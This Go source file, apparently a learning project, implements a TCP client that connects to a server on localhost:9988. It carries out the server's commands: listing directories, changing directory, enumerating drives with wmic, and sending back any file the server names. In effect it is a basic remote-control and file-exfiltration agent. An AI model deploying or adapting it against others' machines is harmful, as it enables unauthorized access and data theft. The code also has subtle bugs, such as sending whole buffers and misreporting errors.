// socket-client project main.go
package main

import (
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"os/exec"
	"strconv"
	"strings"
)

const (
	SERVER_HOST = "localhost"
	SERVER_PORT = "9988"
	SERVER_TYPE = "tcp"
)

func main() {
	//establish connection
	connection, err := net.Dial(SERVER_TYPE, SERVER_HOST+":"+SERVER_PORT)
	if err != nil {
		panic(err)
	}
	for {
		///send some data
		buffer := make([]byte, 4096)
		mLen, err := connection.Read(buffer)
		if err != nil {
			fmt.Println("Error reading:", err.Error())
		}
		var command string = string(buffer[:mLen])
		fmt.Println("Command Recieved :", command)
		if command == "dir" {
			out, err := exec.Command("cmd", "/c", "dir").Output()

			// if there is an error with our execution
			// handle it here
			if err != nil {
				fmt.Printf("%s", err)
			}
			//fmt.Println("Command Successfully Executed")
			output := string(out[:])
			_, err1 := connection.Write([]byte(output))
			if err1 != nil {
				fmt.Printf("%S", err)
			}
			//fmt.Println(output)
		} else if command == "back" {
			err := os.Chdir("..")
			//cwd, _ := os.Getwd()
			// if there is an error with our execution
			// handle it here
			if err != nil {
				fmt.Printf("%s", err)
			}
			fmt.Println("Command Successfully Executed")
			//output := string(cwd[:])
			out, err := exec.Command("cmd", "/c", "dir").Output()

			// if there is an error with our execution
			// handle it here
			if err != nil {
				fmt.Printf("%s", err)
			}
			//fmt.Println("Command Successfully Executed")
			output := string(out[:])
			//fmt.Println(output)
			_, err1 := connection.Write([]byte(output))
			if err1 != nil {
				fmt.Printf("%s", err1)
			}
			//fmt.Println(output)
		} else if command == "move" {
			out, err := exec.Command("cmd", "/c", "dir").Output()
			// if there is an error with our execution
			// handle it here
			if err != nil {
				fmt.Printf("%s", err)
			}
			//fmt.Println("Command Successfully Executed")
			output := string(out[:])
			//fmt.Println(output)
			_, err1 := connection.Write([]byte(output))
			if err1 != nil {
				fmt.Printf("%s", err)
			}
			var directory string
			mLen, err := connection.Read(buffer)
			if err != nil {
				fmt.Printf("%s", err)
			}
			directory = string(buffer[:mLen])
			//fmt.Println("Directory :", directory)
			error := os.Chdir(directory)
			cwd, _ := os.Getwd()
			// // if there is an error with our execution
			// // handle it here
			if error != nil {
				fmt.Printf("%s", err)
			}
			// //fmt.Println("Command Successfully Executed")
			outputi := string(cwd[:])
			_, err2 := connection.Write([]byte(outputi))
			if err2 != nil {
				fmt.Printf("%s", err)
			}
			// fmt.Println(outputi)
		} else if command == "disks" {
			out, err := exec.Command("cmd", "/c", "wmic logicaldisk get name").Output()

			// if there is an error with our execution
			// handle it here
			if err != nil {
				fmt.Printf("%s", err)
			}
			//fmt.Println("Command Successfully Executed")
			output := string(out[:])
			_, err1 := connection.Write([]byte(output))
			if err1 != nil {
				fmt.Printf("%s", err1)
			}
			//fmt.Println(output)
		} else if command == "download" {
			buffer := make([]byte, 4096)
			mLen, err := connection.Read(buffer)
			if err != nil {
				fmt.Println("Error reading:", err.Error())
			}
			var filename string
			if strings.Contains(string(buffer[:mLen]), ",") {
				res1 := strings.ReplaceAll(string(buffer[:mLen]), ",", " ")
				filename = res1
			} else {
				filename = string(buffer[:mLen])
			}

			fmt.Println("Filename :", filename)
			if _, err := os.Stat(filename); err == nil {
				fmt.Printf("File exists\n")
				fInfo, err := os.Stat(filename)
				if err != nil {
					log.Fatal(err)
				}
				fsize := fInfo.Size()
				StrFileSize := strconv.Itoa(int(fsize))
				//var filesize int = int(fsize)
				_, err = connection.Write([]byte(StrFileSize))
				//fmt.Println("Filesize :", StrFileSize)
				//fmt.Printf("The file size is %d bytes\n", fsize)
				f, err := os.Open(filename)
				if err != nil {
					log.Fatalf("unable to read file: %v", err)
				}
				defer f.Close()
				var iterator int = 0
				buf := make([]byte, 4096)
				for {
					n, err := f.Read(buf)
					iterator = iterator + n
					_, err = connection.Write((buf))
					//fmt.Println("Bytes :")
					//fmt.Println(n)
					if iterator >= int(fsize) {
						fmt.Println("File has Ended")
						//_, err = connection.Write([]byte("File_Ended"))
						break
					}
					if err == io.EOF {
						//_, err = connection.Write([]byte("File_Ended"))
						fmt.Println("Inside EOF-File has Ended")
						//_, err = connection.Write([]byte("File_Ended"))
						break
					}
					if err != nil {
						fmt.Println(err)
						continue
					}
					if n > 0 {
						//fmt.Println(string(buf[:n]))
					}
				}
				//fmt.Println("File has ended")
				//_, err = connection.Write([]byte("File_Ended"))
			} else {
				fmt.Printf("File does not exist\n")
				_, err = connection.Write([]byte("File_Not_Exists"))

			}
		}

		//fmt.Println("Received: ", string(buffer[:mLen]))
		//_, err = connection.Write([]byte("Thanks! Got your message:" + string(buffer[:mLen])))
		//defer connection.Close()
	}
}

/*
fmt.Println(command)
	if command == "whoami" {
		_, err = connection.Write([]byte("whoami"))
	} else if command == "dir" {
		_, err = connection.Write([]byte("dir"))
	} else {
		_, err = connection.Write([]byte("Hello Server! Greetings."))
		buffer := make([]byte, 1024)
		mLen, err := connection.Read(buffer)
		if err != nil {
			fmt.Println("Error reading:", err.Error())
		}
		fmt.Println("Received: ", string(buffer[:mLen]))
		defer connection.Close()
	}
*/
